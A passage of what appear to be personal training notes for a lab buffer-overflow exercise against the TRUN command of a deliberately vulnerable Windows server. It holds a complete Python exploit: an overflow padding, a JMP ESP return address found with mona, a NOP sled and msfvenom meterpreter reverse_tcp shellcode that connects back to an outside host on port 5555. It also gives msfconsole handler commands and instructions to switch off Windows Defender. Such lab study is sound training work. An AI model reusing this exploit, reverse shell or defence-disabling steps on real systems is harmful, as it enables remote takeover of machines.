s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
print s.recv(1024) ## Print to screen what we recieve
s.send(buf) ## Send our buf variable
print s.recv(1024) ## Print to screen what we recieve
s.close ## Close the socket
```
- we see "BBBB" in ASCII 42424242.

- Then take out the third "buf" variable the ```buf += "BBBB"```

- in the white bar at bottom of the immunity put ```!mona jmp -r ESP -m "essfunc.dll```
- windows
- log data
- results torwards bottom

- Take that address, turn to little endian and replace with the 3rd varibles previous value
- add the nop sled
- generate you msfvenom payload
- add these to your scripts

### script now 
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 10

## msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.27.61 lport=5555 -b "\x00" -f python

buf += b"\xba\x7e\xf6\x84\x9b\xd9\xcc\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x59\x31\x56\x14\x03\x56\x14\x83\xc6"
buf += b"\x04\x9c\x03\x78\x73\xef\xec\x81\x84\x8f\xdd\x53"
buf += b"\xe0\xc4\x4c\x64\x62\x88\x7c\x0d\x91\xa7\x2f\x19"
buf += b"\xd1\xc5\xe7\x10\x1a\x26\x4f\x18\xc2\x09\x6f\x31"
buf += b"\x36\x08\x13\x48\x6b\xea\x2a\x83\x7e\xeb\x6b\x55"
buf += b"\xf4\x04\x21\xed\xa4\xca\x4d\xb3\x74\xbd\x50\xe4"
buf += b"\x0e\x01\x2b\x81\xd1\xf5\x87\x88\x01\xa5\x9c\xc3"
buf += b"\xb9\xce\xfb\xf3\xb8\x03\x7e\x3a\xce\x9f\xc8\x36"
buf += b"\x1b\x54\xcb\x9e\x55\x95\xfd\xde\x57\xa6\xf3\x72"
buf += b"\x56\xff\x34\x6b\x2c\x0b\x47\x16\x37\xc8\x35\xcc"
buf += b"\xb2\xce\x9e\x87\x65\x2a\x1e\x4b\xf3\xb9\x2c\x20"
buf += b"\x77\xe5\x30\xb7\x54\x9e\x4d\x3c\x5b\x70\xc4\x06"
buf += b"\x78\x54\x8c\xdd\xe1\xcd\x68\xb3\x1e\x0d\xd4\x6c"
buf += b"\xbb\x46\xf7\x7b\xbb\xa7\x07\x84\xe1\x3f\xcb\x49"
buf += b"\x1a\xbf\x43\xd9\x69\x8d\xcc\x71\xe6\xbd\x85\x5f"
buf += b"\xf1\xb4\x82\x5f\x2d\x7e\xc2\xa1\xce\x7e\xca\x65"
buf += b"\x9a\x2e\x64\x4f\xa3\xa5\x74\x70\x76\x53\x7f\xe6"
buf += b"\x73\x91\x64\xcb\xeb\xd7\x9a\x26\x5f\x5e\x7c\x18"
buf += b"\xcf\x30\xd1\xd9\xbf\xf0\x81\xb1\xd5\xff\xfe\xa2"
buf += b"\xd5\x2a\x97\x49\x3a\x82\xcf\xe5\xa3\x8f\x84\x94"
buf += b"\x2c\x1a\xe1\x97\xa7\xae\x15\x59\x40\xdb\x05\x8e"
buf += b"\x37\x23\xd6\x4f\xd2\x23\xbc\x4b\x74\x74\x28\x56"
buf += b"\xa1\xb2\xf7\xa9\x84\xc1\xf0\x56\x59\xf3\x8b\x61"
buf += b"\xcf\xbb\xe3\x8d\x1f\x3b\xf4\xdb\x75\x3b\x9c\xbb"
buf += b"\x2d\x68\xb9\xc3\xfb\x1d\x12\x56\x04\x77\xc6\xf1"
buf += b"\x6c\x75\x31\x35\x33\x86\x14\x45\x34\x78\xea\x62"
buf += b"\x9d\x10\x14\x33\x1d\xe0\x7e\xb3\x4d\x88\x75\x9c"
buf += b"\x62\x78\x75\x37\x2b\x10\xfc\xd6\x99\x81\x01\xf3"
buf += b"\x7c\x1f\x01\xf0\xa4\x90\x78\x79\x5a\x51\x7d\x93"
buf += b"\x3f\x52\x7d\x9b\x41\x6f\xab\xa2\x37\xae\x6f\x91"
buf += b"\x48\x85\xd2\xb0\xc2\xe5\x41\xc2\xc6"



## 625012A0 -> "\xa0\x12\x50\x62"

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
print s.recv(1024) ## Print to screen what we recieve
s.send(buf) ## Send our buf variable
print s.recv(1024) ## Print to screen what we recieve
s.close ## Close the socket
```

- open msfconsole
```use multi/handler```
```show options```
```set payload windows/meterpreter/reverse_tcp```
```set lhost 0.0.0.0```
```set lport 5555```
```exploit```
- before you run the exploit make sure the immunity is reset and running.
- Also make sure in defender:
  - Virus & threat protection
    - every radio button is turned off


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Day 6 (20240926)
    
